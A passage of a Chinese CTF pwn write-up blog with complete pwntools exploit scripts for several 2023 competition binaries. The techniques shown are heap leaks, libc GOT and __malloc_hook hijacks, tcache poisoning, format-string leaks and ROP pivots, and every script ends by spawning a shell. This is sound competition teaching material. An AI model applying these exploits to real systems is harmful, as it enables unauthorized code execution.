class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141959823.png" alt="image-20230914195949604" style="zoom:50%;" /><p>解释一下泄露过程（注：Free功能会置零heap[i]，但不会置零其控制头）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 申请堆块0</span><br><span class="line">2. 修改堆块0，卡在sleep，此时heap[0]和heap_size（0x62）已确定</span><br><span class="line">3. 释放堆块0</span><br><span class="line">4. 申请堆块0，拿回了前一个堆块0的控制头，但新开辟了一个空间给新的堆块0（新旧大小不一致）</span><br><span class="line">5. 申请堆块1</span><br><span class="line">6. 等到sleep结束，通过heap[0]修改堆块1控制头，使其指向同一页的main_arena处</span><br></pre></td></tr></table></figure><p>同理，第二次修改控制头指针指向 environ 泄露出栈地址，第三次修改返回地址为 onegadget 和 system(“/bin/sh”) 即可。</p><p>当然这里还有另一种利用方式：第二次修改控制头指针指向 libc 的 got 表中的 strspn。参考的是这位师傅的<a href="https://kagehutatsu.com/?p=845">2023 羊城杯 Pwn Writeup</a>。至于为什么是 strspn？这是因为我们的程序中调用了 strtok 函数，而 strtok 调用了 libc.got.plt 中的 strspn，且第一个参数正好是我们可控的！难怪说 ELF(“./libc-2.35.so”) 总是显示 libc 的 GOT 表是可以劫持的！</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309142251383.png" alt="image-20230914225117957" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309142253516.png" alt="image-20230914225331345" style="zoom:50%;" /><p>当然这种打法一般在字符串相关函数多的程序才好利用，否则还是老老实实打栈溢出好一些。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    p = <span class="string">b&quot;1&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += content</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p = <span class="string">b&quot;2&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p = <span class="string">b&quot;3&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode() + <span class="string">b&quot;:&quot;</span> + content</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line">    <span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p = <span class="string">b&quot;4&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\xa0\x08&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">offset = <span class="number">0x7ff94dc19c80</span> - <span class="number">0x7ff94da00000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;env ===&gt; &quot;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x68</span>)  <span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;t&#x27;</span>*<span class="number">0x60</span> + p64(libc_base+<span class="number">0x219008</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base+<span class="number">0x219008</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(system)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023DAS六月赛"><a href="#2023DAS六月赛" class="headerlink" title="2023DAS六月赛"></a>2023DAS六月赛</h1><h2 id="1-easynote"><a href="#1-easynote" class="headerlink" title="1. easynote"></a>1. easynote</h2><p>libc-2.23 的 uaf 漏洞，直接打模板，因为用 docker 打的，干脆直接用了 glibc-all-in-one 的 libc 和 ld。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;bbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;ccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;eee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45206</span>, <span class="number">0x4525a</span>, <span class="number">0xef9f4</span>, <span class="number">0xf0897</span>]</span><br><span class="line">malloc_hook = lb + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = lb + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="comment">#free_hook = lb + libc.sym[&quot;__free_hook&quot;]</span></span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line">log.success(<span class="string">&quot;re ==&gt;&quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">b&#x27;s&#x27;</span>*<span class="number">0xb</span> + p64(lb + one_gadget[<span class="number">1</span>]) +p64(realloc))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-can-you-find-me"><a href="#2-can-you-find-me" class="headerlink" title="2. can_you_find_me"></a>2. can_you_find_me</h2><p>libc-2.27 下只有添加和删除堆的操作，存在 off-by-null：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071642328.png" alt="image-20230607164227278" style="zoom: 50%;" /><p>可以修改 prev-size 位和  size 位使用 unlink 造成 tcache poisoning，由于无 show 功能，需要爆破 main_arena+96 为 stdout，打 stdout 泄露 libc，exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x60</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)     <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;d&#x27;</span>*<span class="number">0x70</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x5f0</span>, <span class="string">&#x27;e&#x27;</span>*<span class="number">0x5f0</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;f&#x27;</span>*<span class="number">0x20</span>)     <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x70</span> + <span class="string">b&#x27;\x20\x06&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#-4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#-1</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#-0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x500</span>-<span class="number">8</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;\x60\xe7&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>)          <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x78</span>, p64(system))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>详细流程如下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071708242.png" alt="image-20230607170831057" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071710504.png" alt="image-20230607171022315" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071724501.png" alt="image-20230607172442447" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071804704.png" alt="image-20230607180451501" style="zoom:80%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306071812328.png" alt="image-20230607181237126" style="zoom:80%;" /><h2 id="3-candy-shop"><a href="#3-candy-shop" class="headerlink" title="3. candy_shop"></a>3. candy_shop</h2><p>检查一下保护，发现 got 表可写：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202306081609452.png" alt="image-20230608160942294" style="zoom: 67%;" /><p>程序中存在两次 printf 格式化漏洞和 一次 bss 段上的越界写，思路就是泄露出 libc，然后越界写 printf 的 got 表为 system：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x1695)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me your name: \n&quot;</span>, <span class="string">&quot;%31$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;you have received a gift:0x&quot;</span>)</span><br><span class="line">lb = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)-<span class="number">128</span>-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;option: &quot;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Which one you want to bye: &quot;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &quot;b *$rebase(0x0156D)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;-10&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">6</span> + p64(system))</span><br><span class="line">io.sendline(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-A-dream"><a href="#4-A-dream" class="headerlink" title="4. A_dream"></a>4. A_dream</h2><p>含有子进程的栈溢出（迁移）。值得注意的点有：</p><ol><li>子进程的栈使用的是<code>mmap</code>出的一片空间，与 libc 基址有着固定的偏移。</li><li>主进程开启了沙盒（只允许 <code>read</code>和<code>write</code>，无法利用），但不影响子进程，因此在子进程进行 system(‘/bin/sh’) 即可。</li><li>gdb 调试子进程方法，使用<code>thread x</code>切换进程，<code>info threads</code>查看进程。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./A_dream&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;A_dream&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404080</span> + <span class="number">0x100</span></span><br><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> + p64(bss + <span class="number">0x40</span>) + p64(magic_read)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401483</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401481</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040136c</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = p64(pop_rsi_r15_ret) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&quot;read&quot;</span>]) + p64(pop_rdi_ret) + p64(<span class="number">0x1000</span>) + p64(elf.plt[<span class="string">&quot;sleep&quot;</span>]) + p64(<span class="number">0</span>) + p64(bss-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(magic_read)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">lb = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb ==&gt; &quot;</span> + <span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">system = lb + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = lb + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi_rbp_ret = lb + <span class="number">0x00000000000248f2</span></span><br><span class="line">thread_stack_rop_addr = lb - <span class="number">0x4150</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(ret) + p64(pop_rdi_rbp_ret) + p64(binsh) + p64(<span class="number">0</span>) + p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(thread_stack_rop_addr-<span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-Approoooooooaching"><a 